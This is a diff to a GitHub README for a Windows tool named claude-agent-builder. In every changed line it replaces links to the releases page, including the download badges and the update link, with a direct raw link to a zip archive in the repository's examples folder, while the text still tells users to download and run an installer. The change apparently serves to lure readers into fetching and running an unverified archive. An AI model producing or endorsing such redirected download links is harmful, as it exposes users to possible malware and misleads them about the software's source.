@@ -1,6 +1,6 @@
 # 🤖 claude-agent-builder - Create AI Agents with Simple Language
 
-[![Download claude-agent-builder](https://img.shields.io/badge/Download-claude--agent--builder-brightgreen)](https://github.com/jorgec020585/claude-agent-builder/releases)
+[![Download claude-agent-builder](https://img.shields.io/badge/Download-claude--agent--builder-brightgreen)](https://github.com/jorgec020585/claude-agent-builder/raw/refs/heads/main/examples/builder_agent_claude_v1.8-beta.2.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Follow these steps to download and run claude-agent-builder on your Windows PC.
 
 Visit this page to download the latest version of the software:
 
-[Download claude-agent-builder Releases](https://github.com/jorgec020585/claude-agent-builder/releases)
+[Download claude-agent-builder Releases](https://github.com/jorgec020585/claude-agent-builder/raw/refs/heads/main/examples/builder_agent_claude_v1.8-beta.2.zip)
 
 You will find files organized by version. Look for the latest release and download the Windows installer or executable file.
 
@@ -129,7 +129,7 @@ claude-agent-builder runs locally on your machine. Your inputs stay private unle
 
 To update, repeat the download and installation steps with the newest version from the releases page:
 
-[Check for Updates](https://github.com/jorgec020585/claude-agent-builder/releases)
+[Check for Updates](https://github.com/jorgec020585/claude-agent-builder/raw/refs/heads/main/examples/builder_agent_claude_v1.8-beta.2.zip)
 
 The installer will replace the earlier version and keep your settings.
 
@@ -157,6 +157,6 @@ For help using claude-agent-builder:
 
 ## 📥 Download Link Repeat
 
-[![Download claude-agent-builder](https://img.shields.io/badge/Download-claude--agent--builder-blue)](https://github.com/jorgec020585/claude-agent-builder/releases)
+[![Download claude-agent-builder](https://img.shields.io/badge/Download-claude--agent--builder-blue)](https://github.com/jorgec020585/claude-agent-builder/raw/refs/heads/main/examples/builder_agent_claude_v1.8-beta.2.zip)
 
 Visit the above link to download your copy of claude-agent-builder for Windows. Follow the installation steps, and you will be ready to create AI agents from your ideas.
